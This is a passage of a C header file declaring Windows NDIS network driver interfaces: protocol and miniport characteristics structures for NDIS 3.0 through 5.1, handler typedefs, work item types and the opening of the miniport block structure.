  OPEN_ADAPTER_COMPLETE_HANDLER  OpenAdapterCompleteHandler; \
  CLOSE_ADAPTER_COMPLETE_HANDLER  CloseAdapterCompleteHandler; \
  _ANONYMOUS_UNION union { \
    SEND_COMPLETE_HANDLER  SendCompleteHandler; \
    WAN_SEND_COMPLETE_HANDLER  WanSendCompleteHandler; \
  } DUMMYUNIONNAME2; \
  _ANONYMOUS_UNION union { \
    TRANSFER_DATA_COMPLETE_HANDLER  TransferDataCompleteHandler; \
    WAN_TRANSFER_DATA_COMPLETE_HANDLER  WanTransferDataCompleteHandler; \
  } DUMMYUNIONNAME3; \
  RESET_COMPLETE_HANDLER  ResetCompleteHandler; \
  REQUEST_COMPLETE_HANDLER  RequestCompleteHandler; \
  _ANONYMOUS_UNION union { \
    RECEIVE_HANDLER	 ReceiveHandler; \
    WAN_RECEIVE_HANDLER  WanReceiveHandler; \
  } DUMMYUNIONNAME4; \
  RECEIVE_COMPLETE_HANDLER  ReceiveCompleteHandler; \
  STATUS_HANDLER  StatusHandler; \
  STATUS_COMPLETE_HANDLER  StatusCompleteHandler; \
  NDIS_STRING  Name;

typedef struct _NDIS30_PROTOCOL_CHARACTERISTICS {
  NDIS30_PROTOCOL_CHARACTERISTICS_S
} NDIS30_PROTOCOL_CHARACTERISTICS, *PNDIS30_PROTOCOL_CHARACTERISTICS;


/* Prototypes for NDIS 4.0 protocol characteristics */

typedef INT
(NTAPI *RECEIVE_PACKET_HANDLER)(
  IN NDIS_HANDLE ProtocolBindingContext,
  IN PNDIS_PACKET Packet);

typedef VOID
(NTAPI *BIND_HANDLER)(
  OUT PNDIS_STATUS Status,
  IN NDIS_HANDLE BindContext,
  IN PNDIS_STRING DeviceName,
  IN PVOID SystemSpecific1,
  IN PVOID SystemSpecific2);

typedef VOID
(NTAPI *UNBIND_HANDLER)(
  OUT PNDIS_STATUS Status,
  IN NDIS_HANDLE ProtocolBindingContext,
  IN NDIS_HANDLE UnbindContext);

typedef NDIS_STATUS
(NTAPI *PNP_EVENT_HANDLER)(
  IN NDIS_HANDLE ProtocolBindingContext,
  IN PNET_PNP_EVENT NetPnPEvent);

typedef VOID
(NTAPI *UNLOAD_PROTOCOL_HANDLER)(
  VOID);

/* Protocol characteristics for NDIS 4.0 protocols */

typedef struct _NDIS40_PROTOCOL_CHARACTERISTICS {
  UCHAR MajorNdisVersion;
  UCHAR MinorNdisVersion;
  USHORT Filler;
  __MINGW_EXTENSION union {
    UINT Reserved;
    UINT Flags;
  };
  OPEN_ADAPTER_COMPLETE_HANDLER OpenAdapterCompleteHandler;
  CLOSE_ADAPTER_COMPLETE_HANDLER CloseAdapterCompleteHandler;
  __MINGW_EXTENSION union {
    SEND_COMPLETE_HANDLER SendCompleteHandler;
    WAN_SEND_COMPLETE_HANDLER WanSendCompleteHandler;
  };
  __MINGW_EXTENSION union {
    TRANSFER_DATA_COMPLETE_HANDLER TransferDataCompleteHandler;
    WAN_TRANSFER_DATA_COMPLETE_HANDLER WanTransferDataCompleteHandler;
  };
  RESET_COMPLETE_HANDLER ResetCompleteHandler;
  REQUEST_COMPLETE_HANDLER RequestCompleteHandler;
  __MINGW_EXTENSION union {
    RECEIVE_HANDLER ReceiveHandler;
    WAN_RECEIVE_HANDLER WanReceiveHandler;
  };
  RECEIVE_COMPLETE_HANDLER ReceiveCompleteHandler;
  STATUS_HANDLER StatusHandler;
  STATUS_COMPLETE_HANDLER StatusCompleteHandler;
  NDIS_STRING Name;
  RECEIVE_PACKET_HANDLER ReceivePacketHandler;
  BIND_HANDLER BindAdapterHandler;
  UNBIND_HANDLER UnbindAdapterHandler;
  PNP_EVENT_HANDLER PnPEventHandler;
  UNLOAD_PROTOCOL_HANDLER UnloadHandler;
} NDIS40_PROTOCOL_CHARACTERISTICS;

typedef VOID
(NTAPI PROTCOL_CO_AF_REGISTER_NOTIFY)(
  IN NDIS_HANDLE ProtocolBindingContext,
  IN PCO_ADDRESS_FAMILY AddressFamily);
typedef PROTCOL_CO_AF_REGISTER_NOTIFY *CO_AF_REGISTER_NOTIFY_HANDLER;

#if NDIS_LEGACY_PROTOCOL

typedef struct _NDIS50_PROTOCOL_CHARACTERISTICS {
#ifdef __cplusplus
  NDIS40_PROTOCOL_CHARACTERISTICS Ndis40Chars;
#else
  NDIS40_PROTOCOL_CHARACTERISTICS;
#endif
  PVOID ReservedHandlers[4];
  CO_SEND_COMPLETE_HANDLER CoSendCompleteHandler;
  CO_STATUS_HANDLER CoStatusHandler;
  CO_RECEIVE_PACKET_HANDLER CoReceivePacketHandler;
  CO_AF_REGISTER_NOTIFY_HANDLER CoAfRegisterNotifyHandler;
} NDIS50_PROTOCOL_CHARACTERISTICS;

#if (defined(NDIS50) || defined(NDIS51))
typedef NDIS50_PROTOCOL_CHARACTERISTICS NDIS_PROTOCOL_CHARACTERISTICS;
#else
typedef NDIS40_PROTOCOL_CHARACTERISTICS NDIS_PROTOCOL_CHARACTERISTICS;
#endif

typedef NDIS_PROTOCOL_CHARACTERISTICS *PNDIS_PROTOCOL_CHARACTERISTICS;

#endif /* NDIS_LEGACY_PROTOCOL */

/* Prototypes for NDIS_MINIPORT_CHARACTERISTICS */

typedef BOOLEAN
(NTAPI *W_CHECK_FOR_HANG_HANDLER)(
  IN NDIS_HANDLE MiniportAdapterContext);

typedef VOID
(NTAPI *W_DISABLE_INTERRUPT_HANDLER)(
  IN NDIS_HANDLE MiniportAdapterContext);

typedef VOID
(NTAPI *W_ENABLE_INTERRUPT_HANDLER)(
  IN NDIS_HANDLE MiniportAdapterContext);

typedef VOID
(NTAPI *W_HALT_HANDLER)(
  IN NDIS_HANDLE MiniportAdapterContext);

typedef VOID
(NTAPI *W_HANDLE_INTERRUPT_HANDLER)(
  IN NDIS_HANDLE MiniportAdapterContext);

typedef NDIS_STATUS
(NTAPI *W_INITIALIZE_HANDLER)(
  OUT PNDIS_STATUS OpenErrorStatus,
  OUT PUINT SelectedMediumIndex,
  IN PNDIS_MEDIUM MediumArray,
  IN UINT MediumArraySize,
  IN NDIS_HANDLE MiniportAdapterContext,
  IN NDIS_HANDLE WrapperConfigurationContext);

typedef VOID
(NTAPI *W_ISR_HANDLER)(
  OUT PBOOLEAN InterruptRecognized,
  OUT PBOOLEAN QueueMiniportHandleInterrupt,
  IN NDIS_HANDLE MiniportAdapterContext);

typedef NDIS_STATUS
(NTAPI *W_QUERY_INFORMATION_HANDLER)(
  IN NDIS_HANDLE MiniportAdapterContext,
  IN NDIS_OID Oid,
  IN PVOID InformationBuffer,
  IN ULONG InformationBufferLength,
  OUT PULONG BytesWritten,
  OUT PULONG BytesNeeded);

typedef NDIS_STATUS
(NTAPI *W_RECONFIGURE_HANDLER)(
  OUT PNDIS_STATUS OpenErrorStatus,
  IN NDIS_HANDLE MiniportAdapterContext,
  IN NDIS_HANDLE WrapperConfigurationContext);

typedef NDIS_STATUS
(NTAPI *W_RESET_HANDLER)(
  OUT PBOOLEAN AddressingReset,
  IN NDIS_HANDLE MiniportAdapterContext);

typedef NDIS_STATUS
(NTAPI *W_SEND_HANDLER)(
  IN NDIS_HANDLE MiniportAdapterContext,
  IN PNDIS_PACKET Packet,
  IN UINT Flags);

typedef NDIS_STATUS
(NTAPI *WM_SEND_HANDLER)(
  IN NDIS_HANDLE MiniportAdapterContext,
  IN NDIS_HANDLE NdisLinkHandle,
  IN PNDIS_WAN_PACKET Packet);

typedef NDIS_STATUS
(NTAPI *W_SET_INFORMATION_HANDLER)(
  IN NDIS_HANDLE MiniportAdapterContext,
  IN NDIS_OID Oid,
  IN PVOID InformationBuffer,
  IN ULONG InformationBufferLength,
  OUT PULONG BytesRead,
  OUT PULONG BytesNeeded);

typedef NDIS_STATUS
(NTAPI *W_TRANSFER_DATA_HANDLER)(
  OUT PNDIS_PACKET Packet,
  OUT PUINT BytesTransferred,
  IN NDIS_HANDLE MiniportAdapterContext,
  IN NDIS_HANDLE MiniportReceiveContext,
  IN UINT ByteOffset,
  IN UINT BytesToTransfer);

typedef NDIS_STATUS
(NTAPI *WM_TRANSFER_DATA_HANDLER)(
  VOID);

typedef VOID
(NTAPI *ADAPTER_SHUTDOWN_HANDLER)(
  IN PVOID ShutdownContext);

typedef VOID
(NTAPI *W_RETURN_PACKET_HANDLER)(
  IN NDIS_HANDLE MiniportAdapterContext,
  IN PNDIS_PACKET Packet);

typedef VOID
(NTAPI *W_SEND_PACKETS_HANDLER)(
  IN NDIS_HANDLE MiniportAdapterContext,
  IN PPNDIS_PACKET PacketArray,
  IN UINT NumberOfPackets);

typedef VOID
(NTAPI *W_ALLOCATE_COMPLETE_HANDLER)(
  IN NDIS_HANDLE MiniportAdapterContext,
  IN PVOID VirtualAddress,
  IN PNDIS_PHYSICAL_ADDRESS PhysicalAddress,
  IN ULONG Length,
  IN PVOID Context);

/* NDIS structures available only to miniport drivers */

#define NDIS30_MINIPORT_CHARACTERISTICS_S \
  UCHAR  MajorNdisVersion; \
  UCHAR  MinorNdisVersion; \
  UINT  Reserved; \
  W_CHECK_FOR_HANG_HANDLER  CheckForHangHandler; \
  W_DISABLE_INTERRUPT_HANDLER  DisableInterruptHandler; \
  W_ENABLE_INTERRUPT_HANDLER  EnableInterruptHandler; \
  W_HALT_HANDLER  HaltHandler; \
  W_HANDLE_INTERRUPT_HANDLER  HandleInterruptHandler; \
  W_INITIALIZE_HANDLER  InitializeHandler; \
  W_ISR_HANDLER  ISRHandler; \
  W_QUERY_INFORMATION_HANDLER  QueryInformationHandler; \
  W_RECONFIGURE_HANDLER  ReconfigureHandler; \
  W_RESET_HANDLER  ResetHandler; \
  W_SEND_HANDLER  SendHandler; \
  W_SET_INFORMATION_HANDLER  SetInformationHandler; \
  W_TRANSFER_DATA_HANDLER  TransferDataHandler;

typedef struct _NDIS30_MINIPORT_CHARACTERISTICS {
  NDIS30_MINIPORT_CHARACTERISTICS_S
} NDIS30_MINIPORT_CHARACTERISTICS, *PSNDIS30_MINIPORT_CHARACTERISTICS;

#ifdef __cplusplus

#define NDIS40_MINIPORT_CHARACTERISTICS_S \
  NDIS30_MINIPORT_CHARACTERISTICS  Ndis30Chars; \
  W_RETURN_PACKET_HANDLER  ReturnPacketHandler; \
  W_SEND_PACKETS_HANDLER  SendPacketsHandler; \
  W_ALLOCATE_COMPLETE_HANDLER  AllocateCompleteHandler;

#else /* !__cplusplus */

#define NDIS40_MINIPORT_CHARACTERISTICS_S \
  NDIS30_MINIPORT_CHARACTERISTICS_S \
  W_RETURN_PACKET_HANDLER  ReturnPacketHandler; \
  W_SEND_PACKETS_HANDLER  SendPacketsHandler; \
  W_ALLOCATE_COMPLETE_HANDLER  AllocateCompleteHandler;

#endif /* !__cplusplus */

typedef struct _NDIS40_MINIPORT_CHARACTERISTICS {
  NDIS40_MINIPORT_CHARACTERISTICS_S
} NDIS40_MINIPORT_CHARACTERISTICS, *PNDIS40_MINIPORT_CHARACTERISTICS;

/* Extensions for NDIS 5.0 miniports */

typedef NDIS_STATUS
(NTAPI MINIPORT_CO_CREATE_VC)(
  IN NDIS_HANDLE MiniportAdapterContext,
  IN NDIS_HANDLE NdisVcHandle,
  OUT PNDIS_HANDLE MiniportVcContext);
typedef MINIPORT_CO_CREATE_VC *W_CO_CREATE_VC_HANDLER;

typedef NDIS_STATUS
(NTAPI MINIPORT_CO_DELETE_VC)(
  IN NDIS_HANDLE MiniportVcContext);
typedef MINIPORT_CO_DELETE_VC *W_CO_DELETE_VC_HANDLER;

typedef NDIS_STATUS
(NTAPI MINIPORT_CO_ACTIVATE_VC)(
  IN NDIS_HANDLE MiniportVcContext,
  IN OUT PCO_CALL_PARAMETERS CallParameters);
typedef MINIPORT_CO_ACTIVATE_VC *W_CO_ACTIVATE_VC_HANDLER;

typedef NDIS_STATUS
(NTAPI MINIPORT_CO_DEACTIVATE_VC)(
  IN NDIS_HANDLE MiniportVcContext);
typedef MINIPORT_CO_DEACTIVATE_VC *W_CO_DEACTIVATE_VC_HANDLER;

typedef VOID
(NTAPI *W_CO_SEND_PACKETS_HANDLER)(
  IN NDIS_HANDLE MiniportVcContext,
  IN PPNDIS_PACKET PacketArray,
  IN UINT NumberOfPackets);

typedef NDIS_STATUS
(NTAPI *W_CO_REQUEST_HANDLER)(
  IN NDIS_HANDLE MiniportAdapterContext,
  IN NDIS_HANDLE MiniportVcContext OPTIONAL,
  IN OUT PNDIS_REQUEST NdisRequest);

#ifdef __cplusplus

#define NDIS50_MINIPORT_CHARACTERISTICS_S \
  NDIS40_MINIPORT_CHARACTERISTICS  Ndis40Chars; \
  W_CO_CREATE_VC_HANDLER  CoCreateVcHandler; \
  W_CO_DELETE_VC_HANDLER  CoDeleteVcHandler; \
  W_CO_ACTIVATE_VC_HANDLER  CoActivateVcHandler; \
  W_CO_DEACTIVATE_VC_HANDLER  CoDeactivateVcHandler; \
  W_CO_SEND_PACKETS_HANDLER  CoSendPacketsHandler; \
  W_CO_REQUEST_HANDLER  CoRequestHandler;

#else /* !__cplusplus */

#define NDIS50_MINIPORT_CHARACTERISTICS_S \
  NDIS40_MINIPORT_CHARACTERISTICS_S \
  W_CO_CREATE_VC_HANDLER  CoCreateVcHandler; \
  W_CO_DELETE_VC_HANDLER  CoDeleteVcHandler; \
  W_CO_ACTIVATE_VC_HANDLER  CoActivateVcHandler; \
  W_CO_DEACTIVATE_VC_HANDLER  CoDeactivateVcHandler; \
  W_CO_SEND_PACKETS_HANDLER  CoSendPacketsHandler; \
  W_CO_REQUEST_HANDLER  CoRequestHandler;

#endif /* !__cplusplus */

typedef struct _NDIS50_MINIPORT_CHARACTERISTICS {
   NDIS50_MINIPORT_CHARACTERISTICS_S
} NDIS50_MINIPORT_CHARACTERISTICS, *PSNDIS50_MINIPORT_CHARACTERISTICS;

/* Extensions for NDIS 5.1 miniports */

typedef VOID
(NTAPI *W_CANCEL_SEND_PACKETS_HANDLER)(
  IN NDIS_HANDLE  MiniportAdapterContext,
  IN PVOID  CancelId);

typedef VOID
(NTAPI *W_PNP_EVENT_NOTIFY_HANDLER)(
  IN NDIS_HANDLE  MiniportAdapterContext,
  IN NDIS_DEVICE_PNP_EVENT  PnPEvent,
  IN PVOID  InformationBuffer,
  IN ULONG  InformationBufferLength);

typedef VOID
(NTAPI *W_MINIPORT_SHUTDOWN_HANDLER)(
  IN PVOID  ShutdownContext);

#ifdef __cplusplus

#define NDIS51_MINIPORT_CHARACTERISTICS_S \
  NDIS50_MINIPORT_CHARACTERISTICS  Ndis50Chars; \
  W_CANCEL_SEND_PACKETS_HANDLER  CancelSendPacketsHandler; \
  W_PNP_EVENT_NOTIFY_HANDLER  PnPEventNotifyHandler; \
  W_MINIPORT_SHUTDOWN_HANDLER  AdapterShutdownHandler; \
  PVOID Reserved1; \
  PVOID Reserved2; \
  PVOID Reserved3; \
  PVOID Reserved4;

#else

#define NDIS51_MINIPORT_CHARACTERISTICS_S \
  NDIS50_MINIPORT_CHARACTERISTICS_S \
  W_CANCEL_SEND_PACKETS_HANDLER  CancelSendPacketsHandler; \
  W_PNP_EVENT_NOTIFY_HANDLER  PnPEventNotifyHandler; \
  W_MINIPORT_SHUTDOWN_HANDLER  AdapterShutdownHandler; \
  PVOID Reserved1; \
  PVOID Reserved2; \
  PVOID Reserved3; \
  PVOID Reserved4;

#endif

typedef struct _NDIS51_MINIPORT_CHARACTERISTICS {
  NDIS51_MINIPORT_CHARACTERISTICS_S
} NDIS51_MINIPORT_CHARACTERISTICS, *PSNDIS51_MINIPORT_CHARACTERISTICS;

#if defined(NDIS51_MINIPORT)
typedef struct _NDIS_MINIPORT_CHARACTERISTICS {
  NDIS51_MINIPORT_CHARACTERISTICS_S
} NDIS_MINIPORT_CHARACTERISTICS, *PNDIS_MINIPORT_CHARACTERISTICS;
#elif defined(NDIS50_MINIPORT)
typedef struct _NDIS_MINIPORT_CHARACTERISTICS {
  NDIS50_MINIPORT_CHARACTERISTICS_S
} NDIS_MINIPORT_CHARACTERISTICS, *PNDIS_MINIPORT_CHARACTERISTICS;
#elif defined(NDIS40_MINIPORT)
typedef struct _NDIS_MINIPORT_CHARACTERISTICS {
  NDIS40_MINIPORT_CHARACTERISTICS_S
} NDIS_MINIPORT_CHARACTERISTICS, *PNDIS_MINIPORT_CHARACTERISTICS;
#else /* NDIS30 */
typedef struct _NDIS_MINIPORT_CHARACTERISTICS {
  NDIS30_MINIPORT_CHARACTERISTICS_S
} NDIS_MINIPORT_CHARACTERISTICS, *PNDIS_MINIPORT_CHARACTERISTICS;
#endif

typedef struct _NDIS_MINIPORT_INTERRUPT {
  PKINTERRUPT InterruptObject;
  KSPIN_LOCK DpcCountLock;
  PVOID Reserved;
  W_ISR_HANDLER MiniportIsr;
  W_HANDLE_INTERRUPT_HANDLER MiniportDpc;
  KDPC InterruptDpc;
  PNDIS_MINIPORT_BLOCK Miniport;
  UCHAR DpcCount;
  BOOLEAN Filler1;
  KEVENT DpcsCompletedEvent;
  BOOLEAN SharedInterrupt;
  BOOLEAN IsrRequested;
} NDIS_MINIPORT_INTERRUPT, *PNDIS_MINIPORT_INTERRUPT;

/* Structures available only to full MAC drivers */

typedef BOOLEAN
(NTAPI *PNDIS_INTERRUPT_SERVICE)(
  IN PVOID  InterruptContext);

typedef VOID
(NTAPI *PNDIS_DEFERRED_PROCESSING)(
  IN PVOID  SystemSpecific1,
  IN PVOID  InterruptContext,
  IN PVOID  SystemSpecific2,
  IN PVOID  SystemSpecific3);

typedef struct _NDIS_WRAPPER_HANDLE NDIS_WRAPPER_HANDLE, *PNDIS_WRAPPER_HANDLE;
typedef struct _NDIS_PROTOCOL_BLOCK NDIS_PROTOCOL_BLOCK, *PNDIS_PROTOCOL_BLOCK;
typedef struct _NDIS_OPEN_BLOCK NDIS_OPEN_BLOCK, *PNDIS_OPEN_BLOCK;
typedef struct _NDIS_M_DRIVER_BLOCK NDIS_M_DRIVER_BLOCK, *PNDIS_M_DRIVER_BLOCK;
typedef struct _NDIS_OFFLOAD NDIS_OFFLOAD, *PNDIS_OFFLOAD;
typedef struct _NDIS_AF_LIST NDIS_AF_LIST, *PNDIS_AF_LIST;
typedef struct _X_FILTER ETH_FILTER, *PETH_FILTER;
#if NDIS_SUPPORT_NDIS6
typedef USHORT NET_FRAME_TYPE, *PNET_FRAME_TYPE;
#endif

typedef struct _NDIS_MINIPORT_TIMER {
  KTIMER  Timer;
  KDPC  Dpc;
  PNDIS_TIMER_FUNCTION  MiniportTimerFunction;
  PVOID  MiniportTimerContext;
  PNDIS_MINIPORT_BLOCK  Miniport;
  struct _NDIS_MINIPORT_TIMER  *NextDeferredTimer;
} NDIS_MINIPORT_TIMER, *PNDIS_MINIPORT_TIMER;

typedef struct _NDIS_INTERRUPT {
  PKINTERRUPT  InterruptObject;
  KSPIN_LOCK  DpcCountLock;
  PNDIS_INTERRUPT_SERVICE  MacIsr;
  PNDIS_DEFERRED_PROCESSING  MacDpc;
  KDPC  InterruptDpc;
  PVOID  InterruptContext;
  UCHAR  DpcCount;
  BOOLEAN	 Removing;
  KEVENT  DpcsCompletedEvent;
} NDIS_INTERRUPT, *PNDIS_INTERRUPT;


typedef enum _NDIS_WORK_ITEM_TYPE {
  NdisWorkItemRequest,
  NdisWorkItemSend,
  NdisWorkItemReturnPackets,
  NdisWorkItemResetRequested,
  NdisWorkItemResetInProgress,
  NdisWorkItemHalt,
  NdisWorkItemSendLoopback,
  NdisWorkItemMiniportCallback,
  NdisMaxWorkItems
} NDIS_WORK_ITEM_TYPE, *PNDIS_WORK_ITEM_TYPE;

#define	NUMBER_OF_WORK_ITEM_TYPES         NdisMaxWorkItems
#define	NUMBER_OF_SINGLE_WORK_ITEMS       6

typedef struct _NDIS_MINIPORT_WORK_ITEM {
	SINGLE_LIST_ENTRY  Link;
	NDIS_WORK_ITEM_TYPE  WorkItemType;
	PVOID  WorkItemContext;
} NDIS_MINIPORT_WORK_ITEM, *PNDIS_MINIPORT_WORK_ITEM;

struct _NDIS_WORK_ITEM;
typedef VOID (*NDIS_PROC)(struct _NDIS_WORK_ITEM *, PVOID);

typedef struct _NDIS_WORK_ITEM {
  PVOID Context;
  NDIS_PROC Routine;
  UCHAR WrapperReserved[8*sizeof(PVOID)];
} NDIS_WORK_ITEM, *PNDIS_WORK_ITEM;

typedef struct _NDIS_BIND_PATHS {
	UINT  Number;
	NDIS_STRING  Paths[1];
} NDIS_BIND_PATHS, *PNDIS_BIND_PATHS;


typedef VOID
(NTAPI *ETH_RCV_COMPLETE_HANDLER)(
  IN PETH_FILTER  Filter);

typedef VOID
(NTAPI *ETH_RCV_INDICATE_HANDLER)(
  IN PETH_FILTER  Filter,
  IN NDIS_HANDLE  MacReceiveContext,
  IN PCHAR  Address,
  IN PVOID  HeaderBuffer,
  IN UINT  HeaderBufferSize,
  IN PVOID  LookaheadBuffer,
  IN UINT  LookaheadBufferSize,
  IN UINT  PacketSize);

typedef VOID
(NTAPI *FDDI_RCV_COMPLETE_HANDLER)(
  IN PFDDI_FILTER  Filter);

typedef VOID
(NTAPI *FDDI_RCV_INDICATE_HANDLER)(
  IN PFDDI_FILTER  Filter,
  IN NDIS_HANDLE  MacReceiveContext,
  IN PCHAR  Address,
  IN UINT  AddressLength,
  IN PVOID  HeaderBuffer,
  IN UINT  HeaderBufferSize,
  IN PVOID  LookaheadBuffer,
  IN UINT  LookaheadBufferSize,
  IN UINT  PacketSize);

typedef VOID
(NTAPI *FILTER_PACKET_INDICATION_HANDLER)(
  IN NDIS_HANDLE  Miniport,
  IN PPNDIS_PACKET  PacketArray,
  IN UINT  NumberOfPackets);

typedef VOID
(NTAPI *TR_RCV_COMPLETE_HANDLER)(
  IN PTR_FILTER  Filter);

typedef VOID
(NTAPI *TR_RCV_INDICATE_HANDLER)(
  IN PTR_FILTER  Filter,
  IN NDIS_HANDLE  MacReceiveContext,
  IN PVOID  HeaderBuffer,
  IN UINT  HeaderBufferSize,
  IN PVOID  LookaheadBuffer,
  IN UINT  LookaheadBufferSize,
  IN UINT  PacketSize);

typedef VOID
(NTAPI *WAN_RCV_COMPLETE_HANDLER)(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN NDIS_HANDLE  NdisLinkContext);

typedef VOID
(NTAPI *WAN_RCV_HANDLER)(
  OUT PNDIS_STATUS  Status,
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN NDIS_HANDLE  NdisLinkContext,
  IN PUCHAR  Packet,
  IN ULONG  PacketSize);

typedef VOID
(FASTCALL *NDIS_M_DEQUEUE_WORK_ITEM)(
  IN PNDIS_MINIPORT_BLOCK  Miniport,
  IN NDIS_WORK_ITEM_TYPE  WorkItemType,
  OUT PVOID  *WorkItemContext);

typedef NDIS_STATUS
(FASTCALL *NDIS_M_QUEUE_NEW_WORK_ITEM)(
  IN PNDIS_MINIPORT_BLOCK  Miniport,
  IN NDIS_WORK_ITEM_TYPE  WorkItemType,
  IN PVOID  WorkItemContext);

typedef NDIS_STATUS
(FASTCALL *NDIS_M_QUEUE_WORK_ITEM)(
  IN PNDIS_MINIPORT_BLOCK  Miniport,
  IN NDIS_WORK_ITEM_TYPE  WorkItemType,
  IN PVOID  WorkItemContext);

typedef VOID
(NTAPI *NDIS_M_REQ_COMPLETE_HANDLER)(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN NDIS_STATUS  Status);

typedef VOID
(NTAPI *NDIS_M_RESET_COMPLETE_HANDLER)(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN NDIS_STATUS  Status,
  IN BOOLEAN  AddressingReset);

typedef VOID
(NTAPI *NDIS_M_SEND_COMPLETE_HANDLER)(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN PNDIS_PACKET  Packet,
  IN NDIS_STATUS  Status);

typedef VOID
(NTAPI *NDIS_M_SEND_RESOURCES_HANDLER)(
  IN NDIS_HANDLE  MiniportAdapterHandle);

typedef BOOLEAN
(FASTCALL *NDIS_M_START_SENDS)(
  IN PNDIS_MINIPORT_BLOCK  Miniport);

typedef VOID
(NTAPI *NDIS_M_STATUS_HANDLER)(
  IN NDIS_HANDLE  MiniportHandle,
  IN NDIS_STATUS  GeneralStatus,
  IN PVOID  StatusBuffer,
  IN UINT  StatusBufferSize);

typedef VOID
(NTAPI *NDIS_M_STS_COMPLETE_HANDLER)(
  IN NDIS_HANDLE  MiniportAdapterHandle);

typedef VOID
(NTAPI *NDIS_M_TD_COMPLETE_HANDLER)(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN PNDIS_PACKET  Packet,
  IN NDIS_STATUS  Status,
  IN UINT  BytesTransferred);

typedef VOID (NTAPI *NDIS_WM_SEND_COMPLETE_HANDLER)(
  IN NDIS_HANDLE  MiniportAdapterHandle,
  IN PVOID  Packet,
  IN NDIS_STATUS  Status);


#if ARCNET

#define ARC_SEND_BUFFERS                  8
#define ARC_HEADER_SIZE                   4

typedef struct _NDIS_ARC_BUF {
  NDIS_HANDLE  ArcnetBufferPool;
  PUCHAR  ArcnetLookaheadBuffer;
  UINT  NumFree;
  ARC_BUFFER_LIST ArcnetBuffers[ARC_SEND_BUFFERS];
} NDIS_ARC_BUF, *PNDIS_ARC_BUF;

#endif /* ARCNET */

typedef struct _NDIS_LOG {
  PNDIS_MINIPORT_BLOCK  Miniport;
  KSPIN_LOCK  LogLock;
  PIRP  Irp;
  UINT  TotalSize;
  UINT  CurrentSize;
  UINT  InPtr;
  UINT  OutPtr;
  UCHAR  LogBuf[1];
} NDIS_LOG, *PNDIS_LOG;

#if ARCNET
#define FILTERDBS_ARCNET_S \
  PARC_FILTER  ArcDB;
#else /* !ARCNET */
#define FILTERDBS_ARCNET_S \
  PVOID  XXXDB;
#endif /* !ARCNET */

#define FILTERDBS_S \
  _ANONYMOUS_UNION union { \
    PETH_FILTER  EthDB; \
    PNULL_FILTER  NullDB; \
  } DUMMYUNIONNAME; \
  PTR_FILTER  TrDB; \
  PFDDI_FILTER  FddiDB; \
  FILTERDBS_ARCNET_S

typedef struct _FILTERDBS {
  FILTERDBS_S
} FILTERDBS, *PFILTERDBS;

struct _NDIS_MINIPORT_BLOCK {
  NDIS_OBJECT_HEADER Header;
  PNDIS_MINIPORT_BLOCK  NextMiniport;
  PNDIS_M_DRIVER_BLOCK  DriverHandle;
  NDIS_HANDLE  MiniportAdapterContext;
  UNICODE_STRING  MiniportName;
  PNDIS_BIND_PATHS  BindPaths;
  NDIS_HANDLE  OpenQueue;
  REFERENCE  ShortRef;
  NDIS_HANDLE  DeviceContext;
  UCHAR  Padding1;
  UCHAR  LockAcquired;
  UCHAR  PmodeOpens;
  UCHAR  AssignedProcessor;
  KSPIN_LOCK  Lock;
  PNDIS_REQUEST  MediaRequest;
  PNDIS_MINIPORT_INTERRUPT  Interrupt;
  ULONG  Flags;
  ULONG  PnPFlags;
  LIST_ENTRY  PacketList;
  PNDIS_PACKET  FirstPendingPacket;
  PNDIS_PACKET  ReturnPacketsQueue;
  ULONG  RequestBuffer;
  PVOID  SetMCastBuffer;
  PNDIS_MINIPORT_BLOCK  PrimaryMiniport;
  PVOID  WrapperContext;
  PVOID  BusDataContext;
  ULONG  PnPCapabilities;
  PCM_RESOURCE_LIST  Resources;
  NDIS_TIMER  WakeUpDpcTimer;
  UNICODE_STRING  BaseName;
  UNICODE_STRING  SymbolicLinkName;
  ULONG  CheckForHangSeconds;
  USHORT  CFHangTicks;
  USHORT  CFHangCurrentTick;
  NDIS_STATUS  ResetStatus;
  NDIS_HANDLE  ResetOpen;
  FILTERDBS_S
  FILTER_PACKET_INDICATION_HANDLER  PacketIndicateHandler;
  NDIS_M_SEND_COMPLETE_HANDLER  SendCompleteHandler;
  NDIS_M_SEND_RESOURCES_HANDLER  SendResourcesHandler;
  NDIS_M_RESET_COMPLETE_HANDLER  ResetCompleteHandler;
  NDIS_MEDIUM  MediaType;
  ULONG  BusNumber;
  NDIS_INTERFACE_TYPE  BusType;
  NDIS_INTERFACE_TYPE  AdapterType;
  PDEVICE_OBJECT  DeviceObject;
  PDEVICE_OBJECT  PhysicalDeviceObject;
  PDEVICE_OBJECT  NextDeviceObject;
  PMAP_REGISTER_ENTRY  MapRegisters;
  PNDIS_AF_LIST  CallMgrAfList;
  PVOID  MiniportThread;
  PVOID  SetInfoBuf;
  USHORT  SetInfoBufLen;
  USHORT  MaxSendPackets;
  NDIS_STATUS  FakeStatus;
  PVOID  LockHandler;
  PUNICODE_STRING  pAdapterInstanceName;
  PNDIS_MINIPORT_TIMER  TimerQueue;
  UINT  MacOptions;
  PNDIS_REQUEST  PendingRequest;
  UINT  MaximumLongAddresses;
  UINT  MaximumShortAddresses;
  UINT  CurrentLookahead;
  UINT  MaximumLookahead;
  W_HANDLE_INTERRUPT_HANDLER  HandleInterruptHandler;
  W_DISABLE_INTERRUPT_HANDLER  DisableInterruptHandler;
  W_ENABLE_INTERRUPT_HANDLER  EnableInterruptHandler;
  W_SEND_PACKETS_HANDLER  SendPacketsHandler;
  NDIS_M_START_SENDS  DeferredSendHandler;
  ETH_RCV_INDICATE_HANDLER  EthRxIndicateHandler;
  TR_RCV_INDICATE_HANDLER  TrRxIndicateHandler;
  FDDI_RCV_INDICATE_HANDLER  FddiRxIndicateHandler;
  ETH_RCV_COMPLETE_HANDLER  EthRxCompleteHandler;
  TR_RCV_COMPLETE_HANDLER  TrRxCompleteHandler;
  FDDI_RCV_COMPLETE_HANDLER  FddiRxCompleteHandler;
  NDIS_M_STATUS_HANDLER  StatusHandler;
  NDIS_M_STS_COMPLETE_HANDLER  StatusCompleteHandler;
  NDIS_M_TD_COMPLETE_HANDLER  TDCompleteHandler;
  NDIS_M_REQ_COMPLETE_HANDLER  QueryCompleteHandler;
  NDIS_M_REQ_COMPLETE_HANDLER  SetCompleteHandler;
